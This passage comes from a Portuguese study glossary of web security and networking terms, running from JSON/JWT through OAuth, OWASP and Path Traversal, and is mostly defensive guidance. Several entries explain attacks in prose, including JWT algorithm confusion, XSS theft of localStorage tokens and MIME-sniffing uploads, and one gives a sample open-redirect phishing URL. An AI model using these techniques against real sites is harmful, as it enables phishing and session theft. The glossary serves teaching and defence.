- **Significado**: Formato textual leve, independente de linguagem e padronizado para intercâmbio de dados estruturados (especialmente em APIs REST e arquivos de configuração como `manifest.json` e `.har`), utilizando o MIME type oficial `application/json`. Suporta seis tipos de dados fundamentais: **objetos** (`{"chave": valor}` — com chaves obrigatoriamente entre **aspas duplas**), **arrays** (`[...]`), **strings** (entre aspas duplas), **números**, **booleanos** (`true`/`false`) e `null` (não suporta comentários, funções ou `undefined`). No navegador, sua conversão segura entre string e objeto é realizada por `JSON.parse()` e `JSON.stringify()`.
- **Explicação simples**: É a "língua franca" universal para enviar fichas de dados pela Internet: um texto organizado com chaves `{}` e colchetes `[]` que qualquer linguagem (JavaScript, Python, Java, Go, C#) consegue ler e escrever instantaneamente.
- **Exemplo de utilização**: Payload JSON retornado por uma API REST (que deve conter apenas os campos necessários, evitando *Excessive Data Exposure*):
  ```json
  {
    "id": 1042,
    "nome": "Maria Silva",
    "ativo": true,
    "perfis": ["estudante", "monitora"]
  }
  ```

##### JWT (JSON Web Token)
- **Nome**: JWT (*JSON Web Token* — Token Web JSON — RFC 7519).
- **Significado**: Padrão aberto para criação de tokens de acesso **autocontidos** (*self-contained* / *stateless*) compostos por três partes codificadas em **Base64URL** e separadas por pontos (`Header.Payload.Signature`):
  1. **Header**: declara o tipo (`"typ": "JWT"`) e o algoritmo de assinatura (`"alg": "RS256"`, `"ES256"` ou `"HS256"`).
  2. **Payload (Claims)**: contém as declarações sobre a identidade e metadados registrados (`iss` emissor, `sub` sujeito/usuário, `aud` audiência, `exp` timestamp de expiração, `iat` emitido em).
  3. **Signature**: assinatura criptográfica calculada sobre `base64Url(Header) + "." + base64Url(Payload)` que garante a **integridade e autenticidade** do token.
  **Pontos críticos de prova**: (1) Um JWT padrão (JWS) é **assinado, não criptografado** — qualquer pessoa pode decodificar o Header e o Payload com `atob()`, logo nunca se deve colocar senhas ou dados secretos no payload; (2) se armazenado em `localStorage`, fica vulnerável a roubo via **XSS**; (3) o servidor deve rejeitar o algoritmo `"none"`, fixar a lista de algoritmos aceitos (evitando ataques de confusão `RS256` $\rightarrow$ `HS256`) e validar `exp`, `iss` e `aud` (veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)).
- **Explicação simples**: É um passaporte plastificado com selo holográfico da Polícia Federal: qualquer pessoa que pegar o passaporte consegue ler seu nome e a data de validade escritos nele (Base64URL não esconde o texto), mas ninguém consegue apagar seu nome e escrever "Diplomata" sem destruir o selo holográfico da assinatura criptográfica.
- **Exemplo de utilização**: Estrutura visual de um JWT enviado no cabeçalho `Authorization` e sua decodificação:
  ```http
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsImV4cCI6MTc5MzQ1NjAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
  ```

---

<a id="s8-k"></a>
### 8.11 Letra K

##### Keep-Alive (Conexão Persistente HTTP / TCP)
- **Nome**: HTTP Keep-Alive (*Persistent Connection* — Conexão Persistente HTTP — RFC 9112) e TCP Keepalive.
- **Significado**: Mecanismo que mantém uma mesma conexão TCP subjacente (e a sessão TLS associada) aberta e reutilizável para múltiplas requisições e respostas HTTP sequenciais, evitando o custo de latência e CPU de realizar um novo *Three-Way Handshake* TCP e um novo *TLS Handshake* para cada imagem, script ou folha de estilo da página. No HTTP/1.0 exigia o cabeçalho explícito `Connection: keep-alive`; a partir do **HTTP/1.1**, conexões persistentes passaram a ser o **comportamento padrão** (encerradas apenas com `Connection: close` ou por timeout de ociosidade). No HTTP/2 e HTTP/3, a conexão única é nativamente persistente e multiplexada.
- **Explicação simples**: Em vez de ligar para o fornecedor, pedir um item, desligar o telefone, ligar de novo para pedir o segundo item e desligar, você faz uma única ligação e mantém a linha aberta até terminar toda a lista de compras.
- **Exemplo de utilização**: Na aba [Network](./02a-devtools-network.md#s2-1) do DevTools, você comprova o funcionamento do *Keep-Alive* quando a primeira requisição ao domínio apresenta as barras **Initial connection** e **SSL** no *Timing*, mas as requisições seguintes com o mesmo **Connection ID** vão direto para **Request sent** / **Waiting for server response (TTFB)**.

---

<a id="s8-l"></a>
### 8.12 Letra L

##### Lax, Strict e None (Políticas do atributo `SameSite`)
- **Nome**: `Strict`, `Lax` e `None` (Valores da diretiva `SameSite` em Cookies HTTP — RFC 6265bis).
- **Significado**: Os três modos da diretiva `SameSite` que controlam quando o navegador deve enviar um cookie em requisições originadas de outros sites (*cross-site*), constituindo uma defesa primária contra **CSRF**:
  - **`SameSite=Strict`**: o cookie **nunca** é enviado em qualquer requisição cross-site, nem mesmo quando o usuário clica em um link normal (`<a href="...">`) vindo de um e-mail ou mecanismo de busca. Máxima segurança para ações sensíveis, mas pode exigir novo login ao seguir links externos.
  - **`SameSite=Lax`** (**padrão nos navegadores modernos** quando `SameSite` é omitido): o cookie é bloqueado em sub-recursos cross-site (`<img>`, `<iframe>`, `fetch`/`XHR` e formulários `<form method="POST">`), mas **é enviado** em navegações de nível superior (*top-level navigation*) que utilizem métodos HTTP seguros (`GET`), como clicar em um link `<a href>`.
  - **`SameSite=None`**: o cookie é enviado tanto em requisições *same-site* quanto *cross-site* (necessário para recursos legítimos em iframes de terceiros ou SSO cross-domain), mas a especificação exige como **[REQUISITO]** técnico que seja acompanhado do atributo **`Secure`** (`SameSite=None; Secure`), caso contrário o navegador rejeita o cookie (veja [Application > Cookies](./02b-devtools-application.md#s2-2)).
- **Explicação simples**: `Strict` é o crachá que você só pode usar se já estava dentro do prédio desde o início; `Lax` deixa você entrar mostrando o crachá pela porta da frente quando vem andando da rua (link `GET`), mas barra encomendas enviadas de fora em seu nome (`POST`); `None` libera o crachá em qualquer lugar, desde que dentro de um carro-forte (`Secure` / HTTPS).
- **Exemplo de utilização**: Tabela mental rápida de envio em contexto *cross-site*:
  ```text
  Clique em link <a href="..."> (GET) : Strict = NÃO envia | Lax = ENVIA | None; Secure = ENVIA
  Submissão <form method="POST">     : Strict = NÃO envia | Lax = NÃO envia | None; Secure = ENVIA
  Chamada fetch() / <img> / <iframe> : Strict = NÃO envia | Lax = NÃO envia | None; Secure = ENVIA
  ```

##### Load Balancer (Balanceador de Carga)
- **Nome**: Load Balancer (Balanceador de Carga de Rede / Aplicação).
- **Significado**: Dispositivo ou serviço de infraestrutura (frequentemente atuando como um **Proxy Reverso** de Camada 4 — TCP/UDP — ou Camada 7 — HTTP/HTTPS, como Nginx, HAProxy, Envoy ou AWS ALB) que distribui o tráfego de entrada entre um grupo (*pool* / *cluster*) de múltiplos servidores de aplicação idênticos no back-end. Garante **alta disponibilidade** (removendo automaticamente servidores que falham no *health check*), **escalabilidade horizontal** e centralização da terminação TLS (*TLS Offloading*). Como o servidor de aplicação passa a enxergar o IP interno do Load Balancer na conexão TCP, o balanceador adiciona o cabeçalho `X-Forwarded-For` ou `Forwarded` (RFC 7239) para informar o IP real do cliente.
- **Explicação simples**: É o organizador de fila única de um grande banco: em vez de todos os clientes correrem para o Guichê 1 até ele travar, o organizador na entrada distribui cada cliente para o próximo caixa livre (Guichês 1, 2, 3 e 4) e retira da escala qualquer guichê que esteja fora do ar.
- **Exemplo de utilização**: Configuração de balanceamento de carga no Nginx com repasse seguro do IP do cliente:
  ```nginx
  upstream backend_cluster {
      server 10.0.1.10:8080;
      server 10.0.1.11:8080;
  }
  ```

##### Local Storage (`window.localStorage`)
- **Nome**: Local Storage (*Web Storage API* — Armazenamento Local Persistente no Navegador).
- **Significado**: Mecanismo de armazenamento chave-valor (`string: string`) **síncrono** do lado do cliente, isolado por **origem** (`esquema + host + porta`) e com capacidade típica de **5 MB por origem**. Diferentemente do `sessionStorage`, os dados gravados no `localStorage` são **persistentes**: não possuem data de expiração automática e permanecem salvos no disco mesmo que o usuário feche a aba, feche o navegador ou reinicie o computador, sendo compartilhados entre todas as abas e janelas abertas da mesma origem. **Risco crítico de segurança (tema obrigatório de prova)**: por ser 100% acessível via JavaScript (`localStorage.getItem()` / `Object.entries(localStorage)`), **não se deve armazenar senhas, JWTs ou tokens de sessão sensíveis no Local Storage**, pois qualquer vulnerabilidade de **XSS** na página ou em uma biblioteca de terceiros permite exfiltrar todos os tokens instantaneamente (veja [Application](./02b-devtools-application.md#s2-2)).
- **Explicação simples**: É um caderno de anotações deixado aberto na mesa da sala para guardar preferências inofensivas (como "modo escuro ativado" ou "idioma português"): mesmo quando você apaga a luz e vai dormir (fecha o navegador), as anotações continuam lá no dia seguinte — por isso mesmo você nunca deve anotar a senha do banco nele.
- **Exemplo de utilização**: Uso adequado do `localStorage` apenas para estado de interface não sensível:
  ```javascript
  // ADEQUADO [BOA PRÁTICA]: preferências visuais de UI
  localStorage.setItem('tema_preferido', 'dark');

  // INSEGURO: guardar JWT ou token de sessão exposto a XSS!
  // localStorage.setItem('auth_token', jwtSecreto); // NÃO FAÇA ISSO
  ```

---

<a id="s8-m"></a>
### 8.13 Letra M

##### MAC Address (Media Access Control Address)
- **Nome**: MAC Address (*Media Access Control Address* — Endereço Físico / Endereço de Hardware).
- **Significado**: Identificador único de **48 bits** (6 bytes), representado normalmente por **12 dígitos hexadecimais** agrupados de dois em dois separados por dois-pontos ou hífens (ex.: `00:1A:2B:3C:4D:5E`), atribuído à placa de interface de rede (NIC — *Network Interface Card*) para comunicação na **Camada de Enlace de Dados (Camada 2 do modelo OSI)**. Os primeiros 24 bits (3 bytes) identificam o fabricante do hardware (**OUI** — *Organizationally Unique Identifier*, registrado no IEEE) e os 24 bits finais identificam a interface específica. **Detalhe fundamental de redes**: o endereço MAC tem escopo **estritamente local ao enlace (LAN)**; a cada roteador (*hop*) pelo qual um pacote passa, os endereços MAC de origem e destino do quadro Ethernet são substituídos, enquanto os endereços IP de origem e destino (exceto quando há NAT) permanecem os mesmos até o destino final.
- **Explicação simples**: O endereço IP é o endereço final da viagem (cidade e rua do destinatário); já o MAC Address é a placa do veículo que faz apenas o trecho atual até a próxima rodoviária (roteador).
- **Exemplo de utilização**: O endereço MAC `FF:FF:FF:FF:FF:FF` (todos os 48 bits em `1`) é o endereço reservado de **Broadcast de Camada 2**, usado por exemplo em requisições *ARP Request* e *DHCP Discover*.

##### Manifest (Web App Manifest)
- **Nome**: Web App Manifest (`manifest.json` / `manifest.webmanifest` — W3C Specification).
- **Significado**: Arquivo em formato **JSON** referenciado no `<head>` do HTML (`<link rel="manifest" href="/manifest.webmanifest">`) que fornece metadados sobre uma aplicação web progressiva (**PWA** — *Progressive Web App*), permitindo que ela seja instalada na tela inicial do dispositivo móvel ou desktop como um aplicativo nativo. Define propriedades como `name`, `short_name`, `start_url`, `scope`, `display` (`standalone`, `fullscreen`, `minimal-ui`, `browser`), `background_color`, `theme_color` e a matriz de `icons`. É inspecionado na primeira seção da aba [Application > Manifest](./02b-devtools-application.md#s2-2) do Chrome DevTools.
- **Explicação simples**: É a "carteira de identidade e ficha de instalação" de um site moderno (PWA), dizendo ao celular e ao computador qual ícone mostrar na área de trabalho, qual nome exibir e qual página abrir quando o usuário clicar no ícone do aplicativo.
- **Exemplo de utilização**: Trecho de um arquivo `manifest.webmanifest` inspecionável na aba Application:
  ```json
  {
    "name": "Portal Acadêmico Seguro",
    "short_name": "Portal",
    "start_url": "/dashboard",
    "display": "standalone",
    "background_color": "#ffffff",
    "theme_color": "#0d47a1"
  }
  ```

##### Máscara de Rede (Subnet Mask)
- **Nome**: Máscara de Sub-rede (*Subnet Mask* / *Netmask*).
- **Significado**: Valor de **32 bits** (no IPv4) composto por uma sequência contínua de bits `1` seguida por uma sequência contínua de bits `0` (ex.: `11111111.11111111.11111111.00000000` = `255.255.255.0` = `/24` em notação CIDR) utilizado pelos hosts e roteadores para separar a **porção de Rede** (bits em `1`) da **porção de Host** (bits em `0`) de um endereço IPv4. Ao aplicar a operação lógica **`AND` bit a bit** entre um endereço IP e sua máscara de sub-rede, obtém-se o **Endereço de Rede**; ao preencher todos os bits de host com `1`, obtém-se o **Endereço de Broadcast** da sub-rede (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: É uma régua vazada colocada por cima do número de IP: a parte onde a régua marca `255` (`11111111`) mostra o código do condomínio (Rede), e a parte onde marca `0` mostra o número da casa dentro daquele condomínio (Host).
- **Exemplo de utilização**: Cálculo para o IP `192.168.1.130` com máscara `255.255.255.192` (`/26`):
  - Rede: `192.168.1.128/26` | Primeiro host útil: `192.168.1.129` | Último host útil: `192.168.1.190` | Broadcast: `192.168.1.191` ($2^6 - 2 = 62$ hosts úteis).

##### MFA / 2FA (Multi-Factor Authentication)
- **Nome**: MFA (*Multi-Factor Authentication* — Autenticação Multifator) / 2FA (*Two-Factor Authentication* — Autenticação em Dois Fatores).
- **Significado**: Controle de segurança de autenticação que exige que o usuário apresente **duas ou mais evidências independentes pertencentes a categorias distintas de fatores** antes de conceder acesso à sessão:
  1. **Conhecimento** (algo que você sabe: senha ou frase secreta);
  2. **Posse** (algo que você tem: chave criptográfica de hardware FIDO2/WebAuthn/Passkey, aplicativo autenticador gerando códigos temporários **TOTP** — RFC 6238 — ou push em dispositivo registrado);
  3. **Inerência** (algo que você é: biometria facial ou impressão digital).
  **Atenção para provas**: exigir "senha + pergunta secreta" ou "senha + PIN numérico" **não é MFA verdadeiro**, pois ambos pertencem ao mesmo fator (conhecimento). Além disso, códigos enviados por **SMS** são considerados o método 2FA mais fraco devido a ataques de *SIM Swapping* e interceptação SS7, recomendando-se **TOTP** ou **WebAuthn/Passkeys** (resistentes a phishing).
- **Explicação simples**: É a porta do cofre que exige ao mesmo tempo digitar o segredo numérico na parede (algo que você sabe) e girar a chave física que está no seu chaveiro (algo que você tem): se um ladrão descobrir só a sua senha na Internet, ele ainda não consegue abrir a porta sem a sua chave física.
- **Exemplo de utilização**: Implementação de MFA resistente a phishing utilizando a API nativa `navigator.credentials.get({ publicKey })` do padrão **WebAuthn / FIDO2**.

##### MIME Sniffing (Detecção de Tipo de Mídia)
- **Nome**: MIME Sniffing (*Content Sniffing* — Adivinhação de Tipo MIME pelo Navegador).
- **Significado**: Comportamento histórico de navegadores web no qual, ao receber um recurso HTTP sem cabeçalho `Content-Type` ou com um `Content-Type` considerado genérico/incorreto (como `text/plain` ou `application/octet-stream`), o navegador inspeciona os primeiros bytes do corpo do arquivo (*magic bytes* ou tags `<script>`/`<html>`) para tentar "adivinhar" seu formato real e executá-lo. Esse comportamento cria uma grave brecha de **XSS**: um atacante pode fazer upload de um arquivo chamado `avatar.jpg` ou `notas.txt` contendo código HTML/JavaScript malicioso e, se o navegador realizar *MIME sniffing*, ele executará o arquivo como HTML/JS na origem da aplicação. A prevenção obrigatória (**[REQUISITO]**) é enviar o cabeçalho `X-Content-Type-Options: nosniff` junto com o `Content-Type` exato.
- **Explicação simples**: É quando o navegador ignora o rótulo oficial da embalagem que diz "Apenas Texto Puro (`text/plain`)", cheira o conteúdo lá dentro, acha parecido com um programa executável (`text/html`) e resolve rodá-lo por conta própria. O header `nosniff` proíbe o navegador de tentar adivinhar.
- **Exemplo de utilização**: Cabeçalhos que impedem *MIME sniffing* no servidor:
  ```http
  Content-Type: text/plain; charset=utf-8
  X-Content-Type-Options: nosniff
  ```

##### Mixed Content (Conteúdo Misto HTTP/HTTPS)
- **Nome**: Mixed Content (Conteúdo Misto em Páginas HTTPS — W3C Mixed Content Specification).
- **Significado**: Situação de insegurança que ocorre quando o documento HTML principal é carregado de forma segura via **HTTPS**, mas tenta carregar sub-recursos (scripts, estilos, iframes, imagens, vídeos ou chamadas `fetch`/`XHR`) através de conexões **HTTP** sem criptografia. Divide-se em duas categorias:
  1. **Mixed Content Passivo / Opcionalmente Bloqueável** (*Optionally-blockable*, hoje promovido automaticamente para HTTPS ou bloqueado pela maioria dos navegadores): imagens `<img>`, `<audio>` e `<video>` em HTTP.
  2. **Mixed Content Ativo / Bloqueável** (*Blockable* — **bloqueado estritamente por padrão pelo navegador**): `<script>`, `<link rel="stylesheet">`, `<iframe>`, `fetch()`, `XMLHttpRequest` e fontes em HTTP, pois um atacante *Man-in-the-Middle* poderia alterar o script HTTP em trânsito e assumir o controle total da página HTTPS inteira.
- **Explicação simples**: É construir um banco blindado (página HTTPS), mas contratar um entregador sem identificação vindo de bicicleta aberta (script HTTP) que ganha acesso irrestrito à sala do cofre assim que entra.
- **Exemplo de utilização**: Na aba [Console](./02c-devtools-console.md#s2-3) e na aba [Network](./02a-devtools-network.md#s2-1) do DevTools, recursos HTTP dentro de uma página HTTPS geram o erro: `Mixed Content: The page at 'https://loja-ficticia.test/' was loaded over HTTPS, but requested an insecure script 'http://cdn.exemplo.test/app.js'. This request has been blocked`. Pode-se mitigar na migração de sistemas legados com `Content-Security-Policy: upgrade-insecure-requests`.

##### Modelo OSI (Open Systems Interconnection)
- **Nome**: Modelo OSI (*Open Systems Interconnection Reference Model* — ISO/IEC 7498-1).
- **Significado**: Modelo conceitual de referência da ISO que padroniza e divide as funções de comunicação de uma rede de computadores em **7 camadas hierárquicas**, onde cada camada presta serviços à camada imediatamente superior e consome serviços da camada inferior por meio de **encapsulamento** de Unidades de Dados de Protocolo (**PDUs**):
  - **Camada 7 — Aplicação** (*Application* — PDU: Dados — HTTP, HTTPS, DNS, DHCP, SMTP, SSH, FTP);
  - **Camada 6 — Apresentação** (*Presentation* — PDU: Dados — Formatação, codificação ASCII/UTF-8, serialização JSON, criptografia TLS/SSL);
  - **Camada 5 — Sessão** (*Session* — PDU: Dados — Controle de diálogo, gerenciamento de sessões NetBIOS/RPC);
  - **Camada 4 — Transporte** (*Transport* — PDU: **Segmento** no TCP / **Datagrama** no UDP — Portas, TCP, UDP, QUIC);
  - **Camada 3 — Rede** (*Network* — PDU: **Pacote** — Endereçamento lógico IP, roteamento, IPv4, IPv6, ICMP, IPSec, Roteadores);
  - **Camada 2 — Enlace de Dados** (*Data Link* — PDU: **Quadro / Frame** — Endereçamento físico MAC, Ethernet, Wi-Fi 802.11, VLAN, ARP, Switches L2);
  - **Camada 1 — Física** (*Physical* — PDU: **Bits** — Sinais elétricos, ópticos ou de rádio, cabos par trançado, fibra óptica, hubs).
- **Explicação simples**: É uma linha de montagem postal de 7 andares: no 7º andar o diretor escreve a carta (Aplicação); no 6º ela é traduzida e criptografada (Apresentação); no 4º é numerada e colocada em caixas com o ramal de destino (Transporte/Porta); no 3º recebe o CEP e o endereço da cidade final (Rede/IP); no 2º é colocada no caminhão que vai até a próxima esquina com a placa local (Enlace/MAC); e no 1º andar vira movimento físico no asfalto (Física/Bits).
- **Exemplo de utilização**: Mnemônico clássico para memorizar da Camada 1 à 7: **F**ísica $\rightarrow$ **E**nlace $\rightarrow$ **R**ede $\rightarrow$ **T**ransporte $\rightarrow$ **S**essão $\rightarrow$ **A**presentação $\rightarrow$ **A**plicação (**F-E-R-T-S-A-A**).

##### Modelo TCP/IP (Arquitetura de Protocolos da Internet)
- **Nome**: Modelo TCP/IP (*Internet Protocol Suite* / Modelo DoD — RFC 1122).
- **Significado**: Arquitetura prática de protocolos sobre a qual a Internet real foi construída, estruturada em **4 camadas** que consolidam as 7 camadas teóricas do Modelo OSI:
  1. **Camada de Aplicação** (engloba as Camadas 5, 6 e 7 do OSI: HTTP, HTTPS/TLS, DNS, SSH, SMTP);
  2. **Camada de Transporte** (equivale à Camada 4 do OSI: TCP, UDP, QUIC);
  3. **Camada de Internet** (equivale à Camada 3 do OSI: IPv4, IPv6, ICMP);
  4. **Camada de Acesso à Rede / Enlace** (engloba as Camadas 1 e 2 do OSI: Ethernet, Wi-Fi, ARP, meio físico). *(Nota: autores modernos como Kurose e Tanenbaum também apresentam um modelo híbrido didático de 5 camadas separando Enlace e Física).*
- **Explicação simples**: Enquanto o Modelo OSI de 7 camadas é a planta acadêmica detalhada de engenharia, o Modelo TCP/IP de 4 camadas é o projeto prático enxuto que realmente roda dentro de todo sistema operacional moderno.
- **Exemplo de utilização**: Correspondência direta cobrada em provas: **Camada de Aplicação TCP/IP = Camadas 5 + 6 + 7 do OSI**; **Camada de Acesso à Rede TCP/IP = Camadas 1 + 2 do OSI**.

---

<a id="s8-n"></a>
### 8.14 Letra N

##### NAT (Network Address Translation)
- **Nome**: NAT (*Network Address Translation* — Tradução de Endereços de Rede — RFC 2663 / RFC 3022).
- **Significado**: Mecanismo executado por roteadores de borda ou firewalls que reescreve os endereços IP (e frequentemente as portas TCP/UDP) nos cabeçalhos dos pacotes IP enquanto eles transitam entre uma rede interna privada (RFC 1918) e a Internet pública. Suas principais modalidades são:
  - **SNAT / PAT (Port Address Translation / NAPT / Masquerading)**: permite que dezenas ou milhares de dispositivos com IPs privados (`192.168.1.x`) compartilhem **um único endereço IPv4 público** de saída, diferenciando cada fluxo de retorno por meio de uma tabela de tradução de portas de origem efêmeras (`192.168.1.10:54321` $\leftrightarrow$ `203.0.113.5:61001`).
  - **DNAT (Destination NAT / Port Forwarding)**: traduz o endereço IP público de destino para o IP privado de um servidor interno específico (ex.: encaminhar tráfego externo da porta 443 para um servidor web na DMZ).
- **Explicação simples**: É a telefonista do PABX de um grande prédio empresarial: quando os 200 funcionários ligam para fora, na tela de quem recebe a ligação aparece sempre o mesmo número geral da empresa; mas a telefonista anota em uma tabela qual ramal interno fez qual ligação para devolver a resposta para a mesa certa.
- **Exemplo de utilização**: Regra `iptables` configurando mascaramento PAT/SNAT para a rede interna `192.168.1.0/24` sair pela interface pública `eth0`:
  ```bash
  iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE
  ```

##### Nonce (Number Used Once)
- **Nome**: Nonce (*Number Used Once* — Número Criptográfico Usado Uma Única Vez).
- **Significado**: Valor aleatório ou pseudoaleatório de alta entropia gerado para ser utilizado **uma única vez** em uma operação criptográfica ou de protocolo, prevenindo ataques de repetição (*Replay Attacks*) ou autorizando execuções pontuais. Na segurança web e de redes, aparece em três contextos principais:
  1. **CSP (`script-src 'nonce-...'`)**: string aleatória em Base64 regenerada pelo servidor **a cada resposta HTTP**; apenas tags `<script nonce="...">` cujo atributo coincida exatamente com o cabeçalho CSP daquela resposta são executadas pelo navegador (mitigando XSS mesmo que o atacante injete uma tag `<script>` no HTML).
  2. **Cifras AEAD (`AES-GCM` / `ChaCha20-Poly1305`)**: vetor de inicialização único por mensagem cifrada com a mesma chave (jamais deve se repetir).
  3. **OpenID Connect (OIDC)**: parâmetro enviado na requisição de autenticação e assinado dentro do *ID Token* para vincular o token à sessão do navegador e impedir *replay*.
- **Explicação simples**: É uma senha descartável que vale apenas para uma única viagem: assim que é usada naquela página ou pacote, ela perde a validade para sempre e a próxima página exige um número totalmente novo.
- **Exemplo de utilização**: Uso de *nonce* pareado entre o cabeçalho CSP e a tag `<script>` no HTML:
  ```http
  Content-Security-Policy: script-src 'nonce-9f8e7d6c5b4a3f2e1d0c' 'strict-dynamic';
  ```
  ```html
  <script nonce="9f8e7d6c5b4a3f2e1d0c">
    iniciarAplicacaoSegura();
  </script>
  ```

---

<a id="s8-o"></a>
### 8.15 Letra O

##### OAuth 2.0 (e OpenID Connect — OIDC)
- **Nome**: OAuth 2.0 (*Open Authorization 2.0* — RFC 6749) e OIDC (*OpenID Connect* — Camada de Identidade sobre OAuth 2.0).
- **Significado**:
  - **OAuth 2.0**: framework padrão da indústria para **delegação de autorização** (*Authorization*), que permite a um usuário (*Resource Owner*) autorizar uma aplicação cliente (*Client*) a acessar recursos protegidos em um servidor (*Resource Server*) usando **Access Tokens** com escopos limitados (`scope`), sem jamais compartilhar sua senha com a aplicação cliente. O fluxo moderno seguro obrigatório (**[REQUISITO]** no OAuth 2.1) para aplicações web e SPAs é o **Authorization Code Flow com PKCE**.
  - **OpenID Connect (OIDC)**: camada de **autenticação** (*Authentication*) construída no topo do OAuth 2.0 que adiciona o escopo `openid`, o endpoint `/userinfo` e a emissão de um **ID Token** (em formato **JWT**) contendo os dados verificados da identidade do usuário ("Entrar com Google / Microsoft / Gov.br").
- **Explicação simples**: O **OAuth 2.0** é a chave de manobrista (*valet key*) de um carro moderno: você entrega ao manobrista um cartão que dá permissão apenas para estacionar o carro a até 20 km/h sem abrir o porta-luvas nem o porta-malas, sem entregar sua chave mestra. Já o **OIDC** é o crachá de identidade oficial que diz quem é o motorista.
- **Exemplo de utilização**: Redirecionamento inicial de um fluxo OAuth 2.0 + OIDC com proteção `state` (anti-CSRF) e `code_challenge` (PKCE):
  ```text
  GET https://auth.exemplo.test/authorize?
    response_type=code&
    client_id=portal_academico&
    redirect_uri=https%3A%2F%2Fapp.exemplo.test%2Fcallback&
    scope=openid%20profile&
    state=xYz987AntiCsrf&
    code_challenge=E9Melhoa2OwvFrGMTJgu...&
    code_challenge_method=S256
  ```

##### Open Redirect (Redirecionamento Aberto)
- **Nome**: Open Redirect (*URL Redirection to Untrusted Site* — Redirecionamento Aberto — CWE-601).
- **Significado**: Vulnerabilidade na qual uma aplicação web aceita uma URL controlada pelo usuário em um parâmetro de consulta (como `?next=`, `?redirect=`, `?returnUrl=` ou `?url=`) e redireciona o navegador (via status HTTP `301`/`302`/`307` com header `Location` ou via JavaScript `window.location.href = ...`) para qualquer domínio externo sem validar se o destino pertence à própria aplicação ou a uma lista estrita de domínios permitidos (*allowlist*). É amplamente explorada em campanhas de **phishing** (pois o link inicial clicado pela vítima possui o domínio e o certificado HTTPS legítimos da instituição, ex.: `https://banco.exemplo.test/login?next=https://banco-falso.test`), no **roubo de códigos/tokens OAuth** (se o `redirect_uri` for vulnerável) e como trampolim para **SSRF**.
- **Explicação simples**: É quando o recepcionista oficial de um banco de confiança aceita um bilhete de um golpista na fila e diz ao cliente: "Agora que você já falou comigo, vá até aquele furgão suspeito estacionado no beco (`https://golpe.test`) para digitar sua senha de novo".
- **Exemplo de utilização**: Validação segura no servidor garantindo que o redirecionamento pós-login aceite apenas caminhos relativos internos:
  ```javascript
  // SEGURO [REQUISITO]: aceita apenas caminho relativo que começa com "/" e NÃO começa com "//"
  const destino = (typeof next === 'string' && next.startsWith('/') && !next.startsWith('//'))
    ? next
    : '/dashboard';
  res.redirect(302, destino);
  ```

##### Origin (Origem Web: Esquema, Host e Porta)
- **Nome**: Origin (Origem de Segurança Web — RFC 6454 / WHATWG URL & HTML Standards) e cabeçalho HTTP `Origin`.
- **Significado**:
  1. **Conceito de Segurança Web**: uma **Origem** é definida de forma exata e indivisível pela **tupla de 3 componentes** de uma URL: **`(esquema/protocolo, host/domínio, porta)`**. Duas URLs possuem a **mesma origem** (*same-origin*) se, e somente se, todos os três componentes forem idênticos. Qualquer diferença em protocolo (`http` vs `https`), subdomínio (`app.exemplo.test` vs `api.exemplo.test`) ou porta (`:443` vs `:8443`) caracteriza uma **origem cruzada** (*cross-origin*), sujeita às restrições da **Same-Origin Policy (SOP)** (veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)). *(Nota: o conceito de **Same-Site** é mais amplo que Same-Origin, pois agrupa subdomínios sob o mesmo eTLD+1, mas para SOP e CORS o que vale é Same-Origin!)*
  2. **Cabeçalho HTTP `Origin`**: header enviado automaticamente pelo navegador em requisições **CORS** e em requisições que alteram estado (`POST`, `PUT`, `PATCH`, `DELETE`), informando ao servidor exatamente qual `esquema://host:porta` iniciou a chamada (sem incluir o caminho nem a query string, ao contrário do header `Referer`).
- **Explicação simples**: A Origem é o endereço completo do apartamento composto por **Tipo de Acesso + Prédio + Número do Andar** (`https` + `loja.exemplo.test` + `:443`). Se mudar o prédio (subdomínio), o andar (porta) ou a escada (http vs https), para o navegador já é outro vizinho estranho (*cross-origin*).
- **Exemplo de utilização**: Comparando origens em relação a `https://loja.exemplo.test:443/produtos`:
  - `https://loja.exemplo.test/carrinho` $\rightarrow$ **Mesma Origem** (*Same-Origin*: mesmo esquema `https`, mesmo host e mesma porta implícita `443`).
  - `http://loja.exemplo.test/produtos` $\rightarrow$ **Origem Cruzada** (esquema `http` diferente).
  - `https://api.loja.exemplo.test/v1` $\rightarrow$ **Origem Cruzada** (host/subdomínio diferente).
  - `https://loja.exemplo.test:8443/produtos` $\rightarrow$ **Origem Cruzada** (porta `8443` diferente).

##### OWASP (Open Worldwide Application Security Project)
- **Nome**: OWASP (*Open Worldwide Application Security Project* — Fundação Aberta para Segurança de Aplicações).
- **Significado**: Fundação global sem fins lucrativos que produz normas técnicas, documentações, metodologias de auditoria e ferramentas gratuitas e de código aberto dedicadas a melhorar a segurança de software. Seus projetos mais cobrados em provas acadêmicas e certificações de segurança são o **OWASP Top 10** (documento de conscientização sobre os 10 riscos mais críticos em aplicações web — edições 2021 e 2025 — e o **OWASP API Security Top 10**), o **OWASP ASVS** (padrão de verificação de requisitos de segurança), o **OWASP Cheat Sheet Series** (guias práticos de implementação segura) e ambientes autorizados de laboratório educacional como **OWASP Juice Shop** e **OWASP WebGoat** (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: É a principal organização mundial de professores, pesquisadores e engenheiros de segurança web que publica gratuitamente os manuais de boas práticas, o ranking das falhas mais perigosas (OWASP Top 10) e os simuladores de treinamento seguros (Juice Shop/WebGoat).
- **Exemplo de utilização**: Consulta às recomendações oficiais da OWASP durante o desenvolvimento e revisão de arquitetura: `OWASP Top 10 (A01 Broken Access Control, A02 Security Misconfiguration, A05 Injection...)`.


---

<a id="s8-p"></a>
### 8.16 Letra P

##### Path Traversal (Travessia de Caminho e Canonicalização — CWE-22)
- **Nome**: Path Traversal (*Improper Limitation of a Pathname to a Restricted Directory* — Travessia de Caminho — CWE-22).
